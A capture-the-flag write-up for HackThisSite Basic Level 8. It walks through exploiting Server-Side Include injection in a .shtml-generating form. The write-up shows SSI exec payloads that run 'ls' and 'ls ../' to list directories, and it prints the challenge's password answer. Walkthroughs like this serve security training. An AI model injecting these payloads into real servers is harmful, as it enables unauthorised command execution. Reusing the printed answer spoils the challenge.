# HackThisSite.org – Basic Level 8 (SSI Injection)

## Challenge Information

* **CTF Name:** HackThisSite
* **Challenge Name:** Level 8
* **Category:** Web / Server-Side Includes (SSI)
* **Difficulty:** Medium (Beginner)
* **Challenge Description:**
  Sam saved the unencrypted password file in `/missions/basic/8/`. A PHP script written by his daughter saves user input to a file, unintentionally introducing a vulnerability.

---

## TL;DR (Summary)

User input is written to a `.shtml` file that is parsed for Server-Side Includes. By injecting SSI commands, directory contents can be listed, revealing the password file.

---

## Thought Process & Approach

Submitting normal input shows that the application generates a random `.shtml` file containing user-controlled content. Since `.shtml` files support Server-Side Includes, this immediately suggests an **SSI injection** vulnerability.

The challenge description explicitly mentions the password file location, so the objective is to navigate to the parent directory and list its contents.

---

## Initial Testing

Inputting a normal value such as:

```
hello
```

Creates a page like:

```
/missions/basic/8/tmp/rbsxovnw.shtml
```

With output:

```
Hi, hello! Your name contains 5 characters.
```

Each submission generates a new random `.shtml` file.

---

## Exploitation Using SSI

Injecting the following payload into the input field:

```
<!--#exec cmd="ls" -->
```

Results in a page displaying multiple `.shtml` filenames from the `tmp` directory, confirming that SSI execution is enabled.

However, the password file is not located in `tmp`, so directory traversal is required.

---

## Directory Traversal via SSI

Using the following SSI payload:

```
<!--#exec cmd="ls ../" -->
```

The generated page outputs:

```
au12ha39vc.php
index.php
level8.php
tmp
```

The obscurely named PHP file stands out.

---

## Solution Steps

1. Submit test input to confirm `.shtml` file generation.
2. Identify SSI execution via injected `exec` directive.
3. Use directory traversal to list the parent directory.
4. Identify the obscure password file.
5. Open the file directly in the browser to retrieve the password.

---

## Final Answer

```
7a9be7ff
```
